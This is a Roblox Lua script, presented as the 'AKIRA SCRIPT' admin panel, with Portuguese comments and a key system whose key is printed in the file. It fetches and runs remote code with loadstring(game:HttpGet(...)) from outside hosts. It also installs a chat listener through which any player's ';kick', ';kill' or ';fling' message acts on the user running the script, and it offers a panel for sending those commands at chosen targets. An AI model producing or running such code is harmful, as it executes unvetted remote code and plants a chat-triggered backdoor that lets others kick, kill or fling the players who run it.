--[[
    AKIRA SCRIPT - OFFICIAL ADMIN PANEL (FULL VERSION)
    Developed by: LK_SOARESBN
    Key: painel_adm_akira
]]

local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local LocalPlayer = Players.LocalPlayer

--// CONFIGURAÇÕES
local CHAVE_MESTRA = "painel_adm_akira"
local NOME_ARQUIVO_SAVE = "Akira_License.txt"

--// CARREGANDO BIBLIOTECAS
local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()

--// LÓGICA DE EXECUÇÃO DE COMANDOS (O "MOTOR" DO SCRIPT)
local function ExecutarComandoLocal(comando)
    local playerName = LocalPlayer.Name:lower()
    local character = LocalPlayer.Character
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
    local root = character and character:FindFirstChild("HumanoidRootPart")

    -- Filtra se o comando é direcionado a este jogador específico
    if comando:match(";kick%s+" .. playerName) then
        LocalPlayer:Kick("Expulso pela Equipe AKIRA SCRIPT")
    elseif comando:match(";kill%s+" .. playerName) then
        if character then character:BreakJoints() end
    elseif comando:match(";fling%s+" .. playerName) then
        if root then root.CFrame = CFrame.new(0, 100000, 0) end
    elseif comando:match(";freeze%s+" .. playerName) then
        if humanoid then humanoid.WalkSpeed = 0 end
    elseif comando:match(";unfreeze%s+" .. playerName) then
        if humanoid then humanoid.WalkSpeed = 16 end
    end
end

-- Ouvinte de Chat (Faz os comandos "pegarem")
local function IniciarEscutaChat()
    for _, canal in pairs(TextChatService.TextChannels:GetChildren()) do
        if canal:IsA("TextChannel") then
            canal.MessageReceived:Connect(function(msg)
                if msg.Text then
                    ExecutarComandoLocal(msg.Text:lower())
                end
            end)
        end
    end
end

--// INTERFACE PRINCIPAL (WINDUI)
local function IniciarPainelPrincipal()
    IniciarEscutaChat() -- Ativa os comandos antes de abrir a UI

    local Window = WindUI:CreateWindow({
        Title = "AKIRA SCRIPT | PAINEL ADM",
        Icon = "shield-check",
        Author = "LK_SOARESBN",
        Size = UDim2.fromOffset(500, 420),
        Transparent = true,
        Theme = "Dark",
    })

    local Tab = Window:Tab({ Title = "Comandos", Icon = "terminal" })
    local Section = Tab:Section({ Title = "Controle de Jogadores", Opened = true })

    local TargetName = ""
    
    Section:Dropdown({
        Title = "Selecionar Alvo",
        Values = (function() 
            local t = {} 
            for _,p in ipairs(Players:GetPlayers()) do table.insert(t, p.Name) end 
            return t 
        end)(),
        Callback = function(opt) TargetName = opt end
    })

    -- Função de Disparo via Chat
    local function EnviarComando(cmd)
        if TargetName == "" then 
            return WindUI:Notify({Title = "Erro", Content = "Selecione um alvo primeiro!", Type = "Error"})
        end
        
        local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:GetChildren()[1]
        if canal then
            canal:SendAsync(";" .. cmd .. " " .. TargetName)
        end
    end

    -- Lista de botões de comandos
    local listaComandos = {"kick", "kill", "fling", "freeze", "unfreeze"}
    for _, cmd in ipairs(listaComandos) do
        Section:Button({
            Title = "EXECUTAR: " .. cmd:upper(),
            Callback = function() EnviarComando(cmd) end
        })
    end
end

--// SISTEMA DE KEY (RAYFIELD)
local AuthWindow = Rayfield:CreateWindow({
   Name = "AKIRA SCRIPT | AUTH SYSTEM",
   LoadingTitle = "Verificando Licença...",
   LoadingSubtitle = "by LK_SOARESBN",
   KeySystem = true,
   KeySettings = {
      Title = "Chave Requerida",
      Subtitle = "Sistema de Verificação Akira",
      Note = "Key: painel_adm_akira",
      FileName = "AkiraKey", 
      SaveKey = true, 
      Key = {CHAVE_MESTRA} 
   }
})

-- Aba de ativação caso a key esteja correta
local AuthTab = AuthWindow:CreateTab("Ativação")
AuthTab:CreateButton({
   Name = "LIBERAR PAINEL ADM",
   Callback = function()
       Rayfield:Notify({Title = "Sucesso", Content = "Acesso concedido!", Duration = 3})
       task.wait(1)
       Rayfield:Destroy() -- Fecha a janela de Key
       IniciarPainelPrincipal() -- Abre o painel real
   end,
})


